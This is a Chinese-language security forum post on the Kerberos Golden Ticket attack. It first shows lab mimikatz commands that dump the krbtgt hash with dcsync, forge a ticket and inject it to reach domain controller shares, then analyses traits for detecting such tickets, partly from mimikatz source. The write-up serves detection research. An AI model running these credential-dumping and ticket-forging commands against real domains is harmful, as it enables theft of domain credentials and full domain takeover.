0x01 何为黄金票据
===========

Golden Ticket 攻击利用了Kerberos 身份验证协议中的一个漏洞，自 Windows 2000 以来，Microsoft 一直将其用作其默认身份验证协议

Kerberos 身份验证的正常工作方式

使用 Kerberos，用户永远不会直接对他们需要使用的各种服务（例如文件服务器）进行身份验证。相反， Kerberos 密钥分发中心 (KDC) 充当受信任的第三方身份验证服务。Active Directory 域中的每个域控制器都运行 KDC 服务。

具体来说，当用户进行身份验证时，KDC会发出一个票据授予票据 (TGT)，其中包括一个唯一的会话密钥和一个时间戳，该时间戳指定该会话的有效时间（通常为 8 或 10 小时）。当用户需要访问资源时，无需重新认证；他们的客户端机器只是发送 TGT 来证明用户最近已经通过身份验证。

0x02 mimikatz实行黄金票据攻击
=====================

域控制器：windows server 2012 R2 Standard

域用户：windows 10 专业版

伪造黄金票条件：

1、域名称

2、域的SID值

3、域的KRBTGT账号的HASH

4、伪造任意用户名

首先要提权，管理员账户运行mimikatz，使用下面命令导出krbtgt的hash

```js
mimikatz # privilege::debug 
mimikatz # lsadump::dcsync /domain:test.com /all /csv
mimikatz # lsadump::dcsync /domain:test.com /user:krbtgt
```

![1.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-189cc5a62285a86402ef287e0cf2085ae7b83e11.png)

使用mimikatz生成金票生成.kirbi文件并保存：

```js
kerberos::golden /admin:administrator /domain:test.com /sid:S-1-5-21-369729056-3910723598-3583767373 /krbtgt:ad000f5ff0d6d8a114d343f164691809 /ticket:ticket.kirbi
admin：伪造的用户名 
domain：域名称 
sid：SID值，注意是去掉最后一个-后面的值 
krbtgt：krbtgt的HASH值 
ticket：生成的票据名称
```

先测试一下，无法访问域控制器的共享文件夹

![2.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-81fab6cd73815c6a46189a59f75bda7abdfb7302.png)

用普通用户通过mimikatz中的kerberos::ptt功能将ticket.kirbi导入内存中，然后测试访问共享文件夹

```js
#mimikata注入票据
mimikatz # kerberos::purge 
mimikatz # kerberos::ptt ticket.kirbi
```

![3.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-80fd801952d0f65c0ea313bab5dca70da304f079.png)

测试结果，已经可以访问共享文件夹

![4.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-42636ef8c1c4a1ee4ae3c92e58d4e66ba39be177.png)

0x03 生成票据特征分析
=============

通过 klist 查看注入的票据（#1为注入的票据），通过查看对比可以看到一下异常点：

![5.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-ece51566e8ac5b6fd8b3eec1d8e61596ba51e5e5.png)

分析票据特征
------

1、如果不加参数生成的票据默认时间是10年，并不是默认的8-10个小时，代码位置kuhl\_m\_kerberos.c第455行

![6.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-bfd12aac0a8900b6ac782223d6b1702c4831be4b.png)

2、结束时间与续订时间一致，正常票据的续订时间回超过结束时间，代码默认传入参数是这样的，代码位置kuhl\_m\_kerberos.c第455行

![7.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-c8bf8f9aa5f46debcc782eda4499806a08be42e1.png)

3、生成票据使用rc4加密方式，而查看上图#0票据，用户机器是支持更安全的AES-256加密的，流量上也可以看到机器支持更安全的AES-256的加密方式，却没有使用

![8.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-37392f32c47f2b4a3360844552fbc298b9de65e5.png)

ticket加密方式与域用户加密方式不同

![9.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-5cc568e06c23c04c96aa2fa1f55ef3c8c9d3ae38.png)

4、wireshark使用.keytab文件解密kerberos流量后，也是可以看到票据的时间信息（生成.keytab文件方法下面会放上链接）

![10.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-460ae6d1f8a1f58eabefcdc144162a29510c3fb2.png)

5、生成的黄金票据的用户名不重要，只与User RID和Group RID有关，这个参数是决定是否是域管理员权限，代码默认生成的user rid为500，group rid在代码里定义只有固定的几个，可以作为检测的点

```js
#在kuhl\_m\_kerberos\_pac.c文件的179行，group rid类型 
GROUP\_MEMBERSHIP 
kuhl\_m\_pac\_stringTogroups\_defaultGroups\[\] = {{ 513 , 
DEFAULT\_GROUP\_ATTRIBUTES}, { 512 , 
DEFAULT\_GROUP\_ATTRIBUTES}, { 520 , 
DEFAULT\_GROUP\_ATTRIBUTES}, { 518 , 
DEFAULT\_GROUP\_ATTRIBUTES}, { 519 , 
DEFAULT\_GROUP\_ATTRIBUTES},};
```

kuhl\_m\_kerberos.c文件第412行，默认user rid

![11.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-36ad9889c72a7940d5567fe38471ac02c88da4a7.png)

解开后的流量特征

![12.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-e4385a10d7795af0b08250ebc3ccf6381f1ca569.png)

6、对比正常认证的pac\_info部分，mimikatz生成的只有3个部分（右图），正常认证会有四个（左图）

![13.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-e36503a1486b391f284e5dec4cbf9a55f1c2f7dc.png)

0x04 最后
=======

1、后面这几张图片是远程到公司服务器的截图，本季搭建的域环境，wireshark没有解密成功，所以有“亿”点点糊，大佬们多担待

2、上面这些是需要检测引擎能达到完全解密kerberos协议，并且定时到处域环境的所有账号密码生成.keytab文件才能解密

3、红队大佬如果自定义mimikatz代码可以修改上面的数据特征，上面是基于默认情况下进行的特征分析

最后如有错误，希望大佬们指出。

0x05 参考链接：
==========

<https://docs.microsoft.com/zh-cn/previous-versions/windows/it-pro/windows-server-2003/cc772815(v=ws.10)>

<https://www.jianshu.com/p/4936da524040>

<https://www.cnblogs.com/Erma/p/10338675.html>

<http://cn-sec.com/archives/546065.html>

<https://github.com/gentilkiwi/mimikatz/tree/master/mimikatz>